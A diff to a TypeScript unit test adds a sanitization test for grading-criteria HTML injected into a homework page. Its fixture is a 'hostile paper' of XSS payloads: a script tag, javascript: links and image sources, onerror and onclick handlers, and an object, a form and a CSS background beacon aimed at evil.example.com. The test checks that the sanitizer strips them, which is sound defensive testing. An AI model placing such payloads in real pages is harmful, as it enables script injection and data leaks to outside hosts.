@@ -342,6 +342,71 @@ describe('评分依据的排版', () => {
   });
 });
 
+describe('净化（富文本当作不可信内容）', () => {
+  /** 一份恶意卷：评分依据里塞进各种能执行或外发的东西。 */
+  function hostilePaper(tid: number): HomeworkPaper {
+    return {
+      tid,
+      subjectiveQList: [
+        {
+          id: tid * 10,
+          position: 0,
+          score: 10,
+          judgeDtos: [
+            {
+              id: 1,
+              maxScore: 10,
+              msg:
+                '<p>评分依据' +
+                '<script>window.__pwned = 1</script>' +
+                '<a href="javascript:window.__pwned=2">点我</a>' +
+                '<img src="https://cdn.example.com/a.png" onerror="window.__pwned=3">' +
+                '<img src="javascript:window.__pwned=4">' +
+                '<object data="https://evil.example.com/swf"></object>' +
+                '<form action="https://evil.example.com"><button>提交</button></form>' +
+                '<div onclick="window.__pwned=5" style="background:url(https://evil.example.com/beacon)">点图</div>' +
+                '</p>',
+            },
+          ],
+        },
+      ],
+    };
+  }
+
+  it('危险内容被拆掉或剥属性，剩下的文字仍读得通', async () => {
+    info.mockResolvedValue(ok(homeworkInfo(100)));
+    paper.mockResolvedValue(ok(hostilePaper(100)));
+
+    await injectGuidance(load, 100);
+
+    const block = currentDocument().querySelector(ANSWER_BLOCK)!;
+
+    // 代码与控件类：整体消失
+    expect(block.querySelector('script')).toBeNull();
+    expect(block.querySelector('object')).toBeNull();
+    expect(block.querySelector('form')).toBeNull();
+    expect(block.textContent).not.toContain('__pwned');
+
+    // 链接不在名单里：元素被拆掉，文字留着
+    expect(block.querySelector('a')).toBeNull();
+    expect(block.textContent).toContain('点我');
+
+    // 事件属性与 style 全部剥掉（信标外发就走它）
+    expect(block.querySelectorAll('[onclick], [onerror]')).toHaveLength(0);
+    const styled = Array.from(block.querySelectorAll('div')).find((node) =>
+      (node.textContent ?? '').includes('点图'),
+    )!;
+    expect(styled.getAttribute('style')).toBeNull();
+    expect(styled.getAttribute('onclick')).toBeNull();
+
+    // 图片：协议合法的留下；javascript: 的 src 去掉，但元素与 alt 还在
+    const images = Array.from(block.querySelectorAll('img'));
+    expect(images).toHaveLength(2);
+    expect(images[0]?.getAttribute('src')).toBe('https://cdn.example.com/a.png');
+    expect(images[1]?.hasAttribute('src')).toBe(false);
+  });
+});
+
 describe('页面自己是否已在展示评分依据', () => {
   it('互评打分页自己列出了评分标准：不重复注入，并清掉已有注入', async () => {
     info.mockResolvedValue(ok(homeworkInfo(100)));
